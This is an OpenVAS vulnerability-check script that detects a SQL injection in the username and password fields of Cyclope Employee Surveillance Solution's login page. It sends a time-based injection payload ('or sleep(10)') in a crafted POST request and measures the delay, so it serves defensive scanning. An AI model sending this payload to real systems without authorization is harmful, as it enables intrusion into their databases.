###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cyclope_employee_surveillance_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Cyclope Employee Surveillance Solution SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "Cyclope Employee Surveillance Solution version 6.0.8.5 and prior";
tag_insight = "Input passed to 'username' and 'password' parameter in '/index.php' page is
  not properly verified before being used in SQL queries.";
tag_solution = "No solution or patch is available as of 14th August, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.cyclope-series.com/";
tag_summary = "This host is running Cyclope Employee Surveillance Solution and is
  prone to SQL injection vulnerability.";

if(description)
{
  script_id(803006);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-14 10:50:03 +0530 (Tue, 14 Aug 2012)");
  script_name("Cyclope Employee Surveillance Solution SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/84517");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50200");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20393");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115406/cyclope-sql.txt");

  script_description(desc);
  script_summary("Check if Cyclope Employee Surveillance Solution is vulnerable to SQL injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 7879);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
req1 = "";
req2 = "";
sndReq = "";
rcvRes = "";
postdata1 = "";
postdata2 = "";
nor_stop1 = "";
nor_stop2 = "";
nor_start1 = "";
nor_start2 = "";

## Get HTTP Port
port = get_http_port(default:7879);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

url ="/index.php";

## Get request
sndReq = http_get(item:url, port:port);
rcvRes = http_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && rcvRes =~ "HTTP/1.. 200" && '<title>Cyclope' >< rcvRes &&
   "Cyclope Employee Surveillance Solution" >< rcvRes)
{
  postdata1 = "act=auth-login&pag=login&username=xxx&password=aaa";

  ## Construct a POST normal request
  req1 = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, ":", port, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata1), "\r\n",
                "\r\n", postdata1);

  ## Check the response time for Normal request
  ## Intial time
  nor_start1 = unixtime();

  ## Send the attack
  res = http_keepalive_send_recv(port:port, data:req1);

  nor_stop1 = unixtime();

  ## Construct a POST attack request
  postdata2 = "act=auth-login&pag=login&username=x%27+or+sleep%2810%29+and+" +
              "%271%27%3D%271&password=aaa";

  ## Construct a POST attack request
  req2 = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, ":", port, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata2), "\r\n",
                "\r\n", postdata2);

  ## Check for response time for exploit request with sleep 10
  nor_start2  = unixtime();

  ## Send the attack
  res = http_keepalive_send_recv(port:port, data:req2);

  nor_stop2 = unixtime();

  if(res && res =~ "HTTP/1.. 200" && (nor_stop1 - nor_start1) < 2
     && (nor_stop2 - nor_start2 > 10))
  {
    security_hole(port);
    exit(0);
  }
}

